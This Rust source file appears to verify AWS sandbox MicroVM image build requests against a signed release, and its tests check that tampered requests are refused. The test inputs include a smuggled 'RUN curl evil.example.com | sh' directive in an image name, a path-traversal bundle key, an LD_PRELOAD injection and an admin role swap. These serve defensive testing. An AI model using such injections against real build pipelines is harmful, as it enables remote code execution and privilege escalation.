//! A Live AWS sandbox's MicroVM image on a protected install: the bundle it is built from and the
//! build itself.
//!
//! The bundle decides what the image runs, so the verifier renders it from the image the release
//! signed and is the only writer of the install's bundle bucket. The build request is the one
//! the controller sends on an unprotected install, so it is derived from the same function the
//! controller uses (`alien_aws_clients::sandbox_image_build`) and must equal it field for field,
//! except the two free-form strings that only name the build: the description and the idempotency
//! token. What is sent is that derived request, never the incoming one.

use alien_aws_clients::{
    lambda_microvms::{CreateMicrovmImageRequest, UpdateMicrovmImageRequest},
    sandbox_bundle::{render, RenderedBundle},
    sandbox_image_build::{aws_partition, image_build_inputs, sandbox_image_arn},
};
use alien_core::{
    release_statement,
    sandbox_build_role::{sandbox_build_role_arn, SANDBOX_BUNDLE_STORAGE_ID},
    sandbox_egress::aws_sandbox_agent_environment,
    sandbox_image_permissions::{aws_microvm_session_hooks, image_permissions_environment},
    standard_resource_tags,
};
use alien_permissions::aws_resource_policies::aws_prefixed_resource_name;
use serde_json::Value;

use super::refused;
use super::resource::ResourceFacts;
use crate::error::Result;

/// What a check needs to know: the signed sandbox, the signed stack around it and the install's
/// prefix.
pub struct Signed<'a> {
    pub sandbox: &'a alien_core::Sandbox,
    pub stack: &'a alien_core::Stack,
    pub prefix: &'a str,
    pub id: &'a str,
}

impl<'a> Signed<'a> {
    pub fn of(facts: &'a ResourceFacts<'_>) -> Result<Self> {
        Ok(Self {
            sandbox: facts.sandbox()?,
            stack: &facts.stack,
            prefix: &facts.place.prefix,
            id: facts.resource_id,
        })
    }
}

/// The bucket of the install's sandbox bundles.
pub fn bundle_bucket(prefix: &str) -> String {
    aws_prefixed_resource_name(prefix, SANDBOX_BUNDLE_STORAGE_ID)
}

/// The image's name, which is also the sandbox's cloud name.
fn image_name(facts: &Signed<'_>) -> String {
    aws_prefixed_resource_name(facts.prefix, facts.id)
}

/// The bundle the signed sandbox's image is built from, when `image` is that image.
pub fn check_bundle(facts: &Signed<'_>, image: &str) -> Result<RenderedBundle> {
    let sandbox = facts.sandbox;
    let signed = release_statement::sandbox_pinned_image(facts.id, sandbox)
        .map_err(|error| refused(error.message))?;
    let pinned = release_statement::image_digest(signed);
    if pinned.is_none() || release_statement::image_digest(image) != pinned {
        return Err(refused(format!(
            "PutSandboxBundle builds from {image}, which is not the image {signed} the release \
             signed for sandbox '{}'",
            facts.id
        )));
    }
    render(&bundle_bucket(facts.prefix), image, facts.id).map_err(refused)
}

/// The URI of the bundle rendered from the image the release signed. The request's own URI is
/// never taken: the render is deterministic, so a request naming any other bundle (an older,
/// since revoked image's, say) differs from the derived one and is refused.
fn signed_bundle_uri(facts: &Signed<'_>) -> Result<String> {
    let signed = release_statement::sandbox_pinned_image(facts.id, facts.sandbox)
        .map_err(|error| refused(error.message))?;
    Ok(check_bundle(facts, signed)?.uri())
}

/// The free-form strings of a request, which only name the build.
fn naming(request: &Value) -> Result<(Option<String>, String)> {
    let description = match request.get("description") {
        None => None,
        Some(Value::String(text)) => Some(text.clone()),
        Some(_) => return Err(refused("the build's description is not a string")),
    };
    let token = request
        .get("clientToken")
        .and_then(Value::as_str)
        .ok_or_else(|| refused("the build request has no idempotency token"))?;
    Ok((description, token.to_string()))
}

/// The image-permissions environment of the signed sandbox. A connection's addresses are the
/// target's, which the release does not sign (the target is created after setup), so the
/// verifier cannot tell them from any other private address on the port. A protected install
/// therefore refuses a sandbox that declares connections; mounts and lifecycle steps are fully
/// derived from the signed sandbox.
fn signed_image_permissions_environment(
    sandbox: &alien_core::Sandbox,
) -> Result<std::collections::BTreeMap<String, String>> {
    if let Some(connection) = sandbox
        .image_permissions
        .as_ref()
        .and_then(|permissions| permissions.connections.first())
    {
        return Err(refused(format!(
            "sandbox '{}' declares a direct connection to '{}' on port {}; a protected install \
             cannot check a connection's addresses against the signed release, so it refuses \
             image-permission connections",
            sandbox.id, connection.to.id, connection.port
        )));
    }
    image_permissions_environment(sandbox, |_| Ok(Vec::new()))
        .map_err(|error| refused(error.message))
}

fn inputs(
    facts: &Signed<'_>,
    region: &str,
    account: &str,
    bundle_uri: &str,
) -> Result<alien_aws_clients::sandbox_image_build::ImageBuildInputs> {
    let sandbox = facts.sandbox;
    let tier = sandbox
        .microvm_tier()
        .map_err(|error| refused(format!("the signed limits fit no MicroVM tier: {error}")))?;
    let build_role = sandbox_build_role_arn(aws_partition(region), account, facts.prefix, facts.id);
    let mut environment = aws_sandbox_agent_environment(facts.stack, sandbox);
    environment.extend(signed_image_permissions_environment(sandbox)?);
    Ok(image_build_inputs(
        region,
        facts.id,
        &image_name(facts),
        &build_role,
        bundle_uri,
        tier.baseline_memory_mib,
    )
    .with_agent_environment(environment, aws_microvm_session_hooks(sandbox)))
}

fn same(sent: &Value, derived: &impl serde::Serialize, what: &str) -> Result<()> {
    let mut derived = serde_json::to_value(derived)
        .map_err(|error| refused(format!("the derived {what} does not serialize: {error}")))?;
    let mut sent = sent.clone();
    // The description and token only name the build.
    for value in [&mut derived, &mut sent] {
        if let Some(fields) = value.as_object_mut() {
            fields.remove("description");
            fields.remove("clientToken");
        }
    }
    if sent == derived {
        Ok(())
    } else {
        Err(refused(format!(
            "the {what} differs from the build the signed sandbox gets: the role, the image it \
             builds on, its environment, its network connectors, its tags and its resources must \
             be the derived ones"
        )))
    }
}

/// The create the signed sandbox gets, when `request` is it.
pub fn check_create(
    facts: &Signed<'_>,
    region: &str,
    account: &str,
    request: &Value,
) -> Result<CreateMicrovmImageRequest> {
    let bundle = signed_bundle_uri(facts)?;
    let (description, token) = naming(request)?;
    let mut derived = inputs(facts, region, account, &bundle)?.create_request(
        image_name(facts),
        standard_resource_tags(facts.prefix, facts.id)
            .into_iter()
            .collect(),
    );
    derived.description = description;
    derived.client_token = token;
    same(request, &derived, "CreateMicrovmImage request")?;
    Ok(derived)
}

/// The roll the signed sandbox gets onto `image`, when `request` is it.
pub fn check_update(
    facts: &Signed<'_>,
    region: &str,
    account: &str,
    image: &str,
    request: &Value,
) -> Result<UpdateMicrovmImageRequest> {
    let own = sandbox_image_arn(region, account, &image_name(facts));
    if image != own {
        return Err(refused(format!(
            "UpdateMicrovmImage names image {image}, not {own}, the image this install gives \
             sandbox '{}'",
            facts.id
        )));
    }
    let bundle = signed_bundle_uri(facts)?;
    let (description, token) = naming(request)?;
    let mut derived = inputs(facts, region, account, &bundle)?.update_request();
    derived.description = description;
    derived.client_token = token;
    same(request, &derived, "UpdateMicrovmImage request")?;
    Ok(derived)
}

#[cfg(test)]
mod tests {
    use super::*;
    use alien_core::sandbox_image::ENV_IMAGE_PERMISSIONS;
    use alien_core::{
        ResourceLifecycle, Sandbox, SandboxCode, SandboxEgress, SandboxLifecyclePolicy, Stack,
    };
    use serde_json::json;

    const PREFIX: &str = "acme-abc";
    const ACCOUNT: &str = "123456789012";
    const REGION: &str = "us-east-1";

    fn signed_image() -> String {
        format!(
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/vendor/agents@sha256:{}",
            "a".repeat(64)
        )
    }

    fn stack() -> Stack {
        let sandbox = Sandbox::new("agents".to_string())
            .code(SandboxCode::Image {
                image: signed_image(),
                bundled_from: None,
            })
            .egress(SandboxEgress::Allow)
            .lifecycle(SandboxLifecyclePolicy {
                max_lifetime_seconds: None,
                idle_pause_seconds: None,
                ..Default::default()
            })
            .build();
        Stack::new("app".to_string())
            .add(sandbox, ResourceLifecycle::Live)
            .build()
    }

    fn with_signed<T>(run: impl FnOnce(&Signed<'_>) -> T) -> T {
        let stack = stack();
        let entry = stack.resources.get("agents").expect("the sandbox");
        let sandbox = entry
            .config
            .downcast_ref::<Sandbox>()
            .expect("a sandbox")
            .clone();
        run(&Signed {
            sandbox: &sandbox,
            stack: &stack,
            prefix: PREFIX,
            id: "agents",
        })
    }

    /// The bundle the verifier writes, and the create a controller sends for it.
    fn bundle_and_create(signed: &Signed<'_>) -> (RenderedBundle, Value) {
        let bundle = check_bundle(signed, &signed_image()).expect("the signed image");
        let request = inputs(signed, REGION, ACCOUNT, &bundle.uri())
            .expect("inputs")
            .with_receipt()
            .expect("receipt")
            .create_request(
                format!("{PREFIX}-agents"),
                standard_resource_tags(PREFIX, "agents")
                    .into_iter()
                    .collect(),
            );
        (bundle, serde_json::to_value(request).expect("serialises"))
    }

    #[test]
    fn the_build_the_controller_sends_is_accepted_and_what_is_sent_is_the_derived_request() {
        with_signed(|signed| {
            let (bundle, request) = bundle_and_create(signed);
            assert_eq!(
                bundle.bucket, "acme-abc-sandbox-bundles",
                "the bundle goes to the install's bundle bucket"
            );
            let derived = check_create(signed, REGION, ACCOUNT, &request).expect("accepted");
            assert_eq!(
                serde_json::to_value(&derived).expect("serialises"),
                request,
                "the request that is sent equals the one that was checked"
            );

            // A roll names the install's own image and a bundle of this sandbox.
            let mut roll = request.clone();
            let fields = roll.as_object_mut().expect("an object");
            fields.remove("name");
            fields.remove("tags");
            let image = sandbox_image_arn(REGION, ACCOUNT, &format!("{PREFIX}-agents"));
            check_update(signed, REGION, ACCOUNT, &image, &roll).expect("the signed roll");
        });
    }

    /// The signed sandbox with mounts and a pause step, and `connections` declared.
    fn with_image_permissions(
        connections: Vec<alien_core::SandboxImageConnection>,
    ) -> (Stack, Sandbox) {
        use alien_core::{SandboxImageMount, SandboxImageMountType, SandboxImagePermissions};
        let stack = stack();
        let entry = stack.resources.get("agents").expect("the sandbox");
        let mut sandbox = entry
            .config
            .downcast_ref::<Sandbox>()
            .expect("a sandbox")
            .clone();
        sandbox.egress = SandboxEgress::None;
        sandbox.image_user = Some(0);
        sandbox.lifecycle.on_pause = Some(vec!["/usr/local/bin/app".into(), "pause".into()]);
        sandbox.image_permissions = Some(SandboxImagePermissions {
            mounts: vec![SandboxImageMount {
                mount_type: SandboxImageMountType::Tmpfs,
                path: "/scratch".into(),
                size: Some("64Mi".into()),
                from: None,
            }],
            connections,
        });
        (stack, sandbox)
    }

    fn create_for(signed: &Signed<'_>, environment: BTreeMapEnv) -> Value {
        let bundle = check_bundle(signed, &signed_image()).expect("the signed image");
        let tier = signed.sandbox.microvm_tier().expect("a tier");
        let build_role =
            sandbox_build_role_arn(aws_partition(REGION), ACCOUNT, signed.prefix, signed.id);
        let mut agent = aws_sandbox_agent_environment(signed.stack, signed.sandbox);
        agent.extend(environment);
        serde_json::to_value(
            image_build_inputs(
                REGION,
                signed.id,
                &image_name(signed),
                &build_role,
                &bundle.uri(),
                tier.baseline_memory_mib,
            )
            .with_agent_environment(agent, aws_microvm_session_hooks(signed.sandbox))
            .with_receipt()
            .expect("receipt")
            .create_request(
                format!("{PREFIX}-agents"),
                standard_resource_tags(PREFIX, "agents")
                    .into_iter()
                    .collect(),
            ),
        )
        .expect("serialises")
    }

    type BTreeMapEnv = std::collections::BTreeMap<String, String>;

    /// Mounts and lifecycle steps: the whole contract is derived from the signed sandbox, so the
    /// controller's build is accepted and any edit of the contract is refused.
    #[test]
    fn a_build_with_mounts_and_steps_is_derived_from_the_signed_sandbox() {
        let (stack, sandbox) = with_image_permissions(Vec::new());
        let signed = Signed {
            sandbox: &sandbox,
            stack: &stack,
            prefix: PREFIX,
            id: "agents",
        };
        let environment =
            image_permissions_environment(&sandbox, |_| Ok(Vec::new())).expect("the contract");
        let request = create_for(&signed, environment);
        let contract = request["environmentVariables"][ENV_IMAGE_PERMISSIONS]
            .as_str()
            .expect("the contract is sent")
            .to_string();
        check_create(&signed, REGION, ACCOUNT, &request).expect("the controller's build");
        let mut roll = request.clone();
        roll.as_object_mut().unwrap().remove("name");
        roll.as_object_mut().unwrap().remove("tags");
        let image = sandbox_image_arn(REGION, ACCOUNT, &format!("{PREFIX}-agents"));
        check_update(&signed, REGION, ACCOUNT, &image, &roll).expect("the controller's roll");

        let with_contract = |contract: String| {
            let mut changed = request.clone();
            changed["environmentVariables"][ENV_IMAGE_PERMISSIONS] = json!(contract);
            changed
        };
        for (name, changed) in [
            (
                "an added connection",
                with_contract(contract.replace(
                    "\"connections\":[]",
                    "\"connections\":[{\"cidr\":\"10.42.1.4/32\",\"port\":2049}]",
                )),
            ),
            (
                "another mount",
                with_contract(contract.replace("/scratch", "/data")),
            ),
            (
                "another pause step",
                with_contract(contract.replace("pause", "sh")),
            ),
            ("no contract", {
                let mut changed = request.clone();
                changed["environmentVariables"]
                    .as_object_mut()
                    .unwrap()
                    .remove(ENV_IMAGE_PERMISSIONS);
                changed
            }),
        ] {
            assert_ne!(changed, request, "{name} changed nothing");
            assert!(
                check_create(&signed, REGION, ACCOUNT, &changed).is_err(),
                "{name} was accepted"
            );
        }
    }

    /// Connections: the release signs only which resource a connection goes to, never its
    /// addresses, so the verifier cannot tell a target's address from any other private one.
    /// A protected install refuses the build, whatever addresses the controller sends.
    #[test]
    fn a_build_with_connections_is_refused_on_a_protected_install() {
        use alien_core::{ResourceRef, ResourceType, SandboxImageConnection};
        let (stack, sandbox) = with_image_permissions(vec![SandboxImageConnection {
            to: ResourceRef::new(ResourceType::from("acme/files"), "workspace-files"),
            port: 2049,
        }]);
        let signed = Signed {
            sandbox: &sandbox,
            stack: &stack,
            prefix: PREFIX,
            id: "agents",
        };
        let environment =
            image_permissions_environment(&sandbox, |_| Ok(vec!["10.42.1.4/32".to_string()]))
                .expect("the controller's contract");
        let request = create_for(&signed, environment);
        let error = check_create(&signed, REGION, ACCOUNT, &request)
            .expect_err("the controller's build is refused");
        assert!(
            error.message.contains("protected install"),
            "the reason names the limit: {}",
            error.message
        );
        let mut roll = request.clone();
        roll.as_object_mut().unwrap().remove("name");
        roll.as_object_mut().unwrap().remove("tags");
        let image = sandbox_image_arn(REGION, ACCOUNT, &format!("{PREFIX}-agents"));
        assert!(check_update(&signed, REGION, ACCOUNT, &image, &roll).is_err());
    }

    #[test]
    fn a_bundle_is_rendered_only_from_the_signed_image() {
        with_signed(|signed| {
            let other = format!("evil.example.com/agents@sha256:{}", "b".repeat(64));
            for (name, image) in [
                ("another digest", other.as_str()),
                ("an unpinned tag", "evil.example.com/agents:latest"),
                (
                    "a directive",
                    "x@sha256:aaaa\nRUN curl evil.example.com | sh",
                ),
            ] {
                assert!(check_bundle(signed, image).is_err(), "{name} was accepted");
            }
            // The signed digest through another registry host is the same bytes.
            let proxied = format!("manager.example.com/proxy/agents@sha256:{}", "a".repeat(64));
            check_bundle(signed, &proxied).expect("the same digest through the manager's proxy");
        });
    }

    #[test]
    fn a_build_that_differs_from_the_derived_one_is_refused() {
        with_signed(|signed| {
            let (bundle, request) = bundle_and_create(signed);
            let edits: Vec<(&str, Box<dyn Fn(&mut Value)>)> = vec![
                (
                    "a bundle in another bucket",
                    Box::new(|r| {
                        r["codeArtifact"]["uri"] = json!(format!(
                            "s3://evil/sandbox-bundle/agents/{}/bundle.zip",
                            "c".repeat(64)
                        ))
                    }),
                ),
                (
                    "another sandbox's bundle",
                    Box::new(|r| {
                        r["codeArtifact"]["uri"] = json!(format!(
                            "s3://acme-abc-sandbox-bundles/sandbox-bundle/other/{}/bundle.zip",
                            "c".repeat(64)
                        ))
                    }),
                ),
                (
                    "a key that is not a bundle digest",
                    Box::new(|r| {
                        r["codeArtifact"]["uri"] = json!(
                            "s3://acme-abc-sandbox-bundles/sandbox-bundle/agents/../x/bundle.zip"
                        )
                    }),
                ),
                (
                    "a well-formed bundle of another digest (a revoked image's)",
                    Box::new(|r| {
                        r["codeArtifact"]["uri"] = json!(format!(
                            "s3://acme-abc-sandbox-bundles/sandbox-bundle/agents/{}/bundle.zip",
                            "c".repeat(64)
                        ))
                    }),
                ),
                (
                    "another build role",
                    Box::new(|r| r["buildRoleArn"] = json!("arn:aws:iam::123456789012:role/admin")),
                ),
                (
                    "another base image",
                    Box::new(|r| {
                        r["baseImageArn"] = json!("arn:aws:lambda:us-east-1:999:microvm-image:x")
                    }),
                ),
                (
                    "an added environment variable",
                    Box::new(|r| r["environmentVariables"]["LD_PRELOAD"] = json!("/tmp/x.so")),
                ),
                (
                    "a removed egress connector",
                    Box::new(|r| {
                        r.as_object_mut().unwrap().remove("egressNetworkConnectors");
                    }),
                ),
                (
                    "added tags",
                    Box::new(|r| {
                        r["tags"]["extra"] = json!("x");
                    }),
                ),
                (
                    "another image name",
                    Box::new(|r| {
                        r["name"] = json!("acme-abc-other");
                    }),
                ),
                (
                    "a field the verifier does not know",
                    Box::new(|r| {
                        r["hooks"]["extra"] = json!(true);
                    }),
                ),
            ];
            let _ = &bundle;
            for (name, edit) in edits {
                let mut changed = request.clone();
                edit(&mut changed);
                assert!(
                    check_create(signed, REGION, ACCOUNT, &changed).is_err(),
                    "{name} was accepted"
                );
            }
            // The two free-form strings are the only ones that may differ.
            let mut renamed = request.clone();
            renamed["description"] = json!("Sandbox agents [build:other]");
            renamed["clientToken"] = json!("another-token");
            check_create(signed, REGION, ACCOUNT, &renamed).expect("only the naming differs");

            // A roll of another image is refused.
            let mut roll = request.clone();
            roll.as_object_mut().unwrap().remove("name");
            roll.as_object_mut().unwrap().remove("tags");
            let other = sandbox_image_arn(REGION, ACCOUNT, "acme-abc-other");
            assert!(check_update(signed, REGION, ACCOUNT, &other, &roll).is_err());
        });
    }
}
